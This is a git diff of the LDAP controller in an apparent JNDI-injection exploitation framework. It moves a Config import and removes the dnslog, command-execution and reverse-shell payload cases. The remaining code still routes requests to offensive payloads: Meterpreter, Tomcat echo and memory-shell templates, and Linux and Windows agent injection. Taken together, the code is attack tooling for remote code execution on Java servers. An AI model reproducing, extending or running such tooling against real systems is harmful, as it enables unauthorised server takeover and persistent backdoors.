@@ -17,7 +17,7 @@ import com.nu1r.jndi.template.resin.RSMSFromThreadS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
 import com.nu1r.jndi.template.spring.SpringMemshellTemplate;
 import com.nu1r.jndi.template.tomcat.*;
-import com.nu1r.jndi.gadgets.utils.Config;
+import com.nu1r.jndi.gadgets.Config.Config;
 import com.nu1r.jndi.gadgets.utils.Util;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
@@ -33,7 +33,7 @@ import java.net.URL;
 import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
 import static com.nu1r.jndi.gadgets.utils.InjShell.insertLinAgent;
 import static com.nu1r.jndi.gadgets.utils.InjShell.insertWinAgent;
-import static com.nu1r.jndi.gadgets.utils.Config.*;
+import static com.nu1r.jndi.gadgets.Config.Config.*;
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/basic"})
@@ -55,21 +55,6 @@ public class BasicController implements LdapController {
         switch (payloadType) {
             case meterpreter:
                 className = Meterpreter.class.getName();
-                break;
-            case dnslog:
-                DnslogTemplate dnslogTemplate = new DnslogTemplate(params[0]);
-                dnslogTemplate.cache();
-                className = dnslogTemplate.getClassName();
-                break;
-            case nu1r:
-                CommandTemplate commandTemplate = new CommandTemplate(params[0]);
-                commandTemplate.cache();
-                className = commandTemplate.getClassName();
-                break;
-            case reverseshell:
-                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(params[0], params[1]);
-                reverseShellTemplate.cache();
-                className = reverseShellTemplate.getClassName();
                 break;
             case tomcatecho:
                 className = TomcatEchoTemplate.class.getName();
@@ -455,11 +440,6 @@ public class BasicController implements LdapController {
             }
 
             switch (payloadType) {
-                case dnslog:
-                    String url = base.substring(base.lastIndexOf("/") + 1);
-                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
-                    params = new String[]{url};
-                    break;
                 case nu1r:
                     String cmd = Util.getCmdFromBase(base);
                     System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
